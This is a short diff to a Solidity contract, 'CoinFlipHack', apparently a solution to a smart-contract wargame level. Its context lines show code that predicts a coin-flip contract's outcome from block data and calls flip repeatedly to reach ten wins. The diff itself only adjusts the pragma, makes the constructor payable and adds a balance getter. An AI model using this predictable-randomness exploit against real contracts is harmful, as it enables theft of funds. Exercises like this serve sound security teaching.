@@ -1,4 +1,4 @@
-pragma solidity ^0.5.0;
+pragma solidity >=0.5.0 <0.7.0;
 
 interface CoinFlip {
     function flip(bool _guess) external returns (bool);
@@ -10,7 +10,7 @@ contract CoinFlipHack {
     CoinFlip cp;
     uint256 public prevBlock;
 
-    constructor(address deployedAddress) public {
+    constructor(address deployedAddress) public payable {
         cp = CoinFlip(deployedAddress);
     }
 
@@ -23,7 +23,7 @@ contract CoinFlipHack {
     }
 
     /**
-        @dev Repeatedly deploy this method to hack the contract 
+        @dev Repeatedly deploy this method to hack the contract
         until consecutive wins is equal to 10.
      */
     function checkBlock() public returns (bool) {
@@ -41,6 +41,10 @@ contract CoinFlipHack {
         bool flipResult = coinFlipNow == 1 ? true : false;
         cp.flip.gas(1000000)(flipResult);
         return true;
+    }
+    
+    function getBalance() public view returns(uint){
+      return address(this).balance;
     }
 
 }
